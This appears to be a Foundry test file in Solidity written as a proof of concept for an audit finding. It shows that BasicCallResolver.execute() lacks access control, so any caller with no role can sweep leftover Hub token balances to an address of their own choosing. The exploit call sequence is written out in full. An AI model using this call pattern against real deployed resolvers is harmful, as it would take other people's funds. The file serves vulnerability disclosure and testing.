// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;

import {Test, console} from "forge-std/Test.sol";

import {BasicCallResolver} from "settlement/call-resolvers/BasicCallResolver.sol";
import {
    ExecuteAndWithdrawRequest,
    Fee
} from "settlement/call-resolvers/ICallResolver.sol";
import {RelayHub} from "settlement/RelayHub.sol";

/// @notice PoC: BasicCallResolver.execute() has NO access control and sweeps
/// the resolver's Hub balances to caller-chosen recipients. Any Hub balance
/// left in the reference resolver after an execution - an unswept token, a
/// solver-retained surplus not swept in the same call, or funds sent directly
/// to the resolver - is takeable by the first arbitrary caller, not just the
/// solver or the executor.
///
/// The executor funds the resolver and invokes execute() atomically, so there
/// is no front-running window DURING an execution; this PoC targets the
/// post-execution leftover window, which is permanent: the resolver has no
/// sweep/rescue function of its own, so leftovers sit until someone calls
/// execute() - and anyone can.
contract BasicResolverLeftoverTest is Test {
    RelayHub internal hub;
    BasicCallResolver internal resolver;

    address internal attacker = address(0x4774);
    uint256 internal constant TOKEN_ID = 1;
    uint256 internal constant LEFTOVER = 1000e6;

    function setUp() public {
        hub = new RelayHub(address(this));
        hub.grantRole(hub.OPERATOR_ROLE(), address(this));
        resolver = new BasicCallResolver(address(hub));

        // Simulate a leftover: a prior execution left 1000 units of token 1
        // in the resolver (e.g. the solver's sweep list omitted this token).
        hub.mint(address(resolver), TOKEN_ID, LEFTOVER);
    }

    function test_anyoneSweepsLeftover() public {
        assertEq(hub.balanceOf(address(resolver), TOKEN_ID), LEFTOVER);

        BasicCallResolver.Call[] memory calls = new BasicCallResolver.Call[](0);
        BasicCallResolver.Sweep[] memory sweeps = new BasicCallResolver.Sweep[](1);
        sweeps[0] = BasicCallResolver.Sweep({
            recipient: attacker,
            tokenId: TOKEN_ID
        });
        bytes memory data = abi.encode(calls, sweeps);

        ExecuteAndWithdrawRequest memory req = ExecuteAndWithdrawRequest({
            inChainId: "",
            inCurrency: "",
            outChainId: "",
            outCurrency: "",
            outAmountMinimum: 0,
            depository: "",
            orderAddress: address(0),
            receiver: "",
            data: "",
            fees: new Fee[](0),
            nonce: bytes32(0),
            deadline: 0
        });

        // Attacker holds no role anywhere; the call succeeds anyway.
        vm.prank(attacker);
        resolver.execute(req, false, data);

        assertEq(hub.balanceOf(attacker, TOKEN_ID), LEFTOVER);
        assertEq(hub.balanceOf(address(resolver), TOKEN_ID), 0);
        console.log("ATTACKER swept 1000 leftover units with zero privileges");
    }
}
